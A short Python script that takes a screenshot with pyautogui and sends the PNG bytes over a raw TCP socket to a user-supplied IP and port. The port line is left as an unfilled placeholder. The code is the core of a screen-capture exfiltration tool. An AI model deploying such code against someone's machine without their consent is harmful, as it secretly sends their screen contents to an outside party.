import socket
import pyautogui
import io

def send_screenshot():
    host = "enter ip"
    port = # your port
    screenshot = pyautogui.screenshot()

    # Convert the screenshot to bytes
    screenshot_bytes = io.BytesIO()
    screenshot.save(screenshot_bytes, format="PNG")
    screenshot_data = screenshot_bytes.getvalue()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((host, port))
        client_socket.sendall(screenshot_data)

    print("Sent")

if __name__ == "__main__":
    send_screenshot()
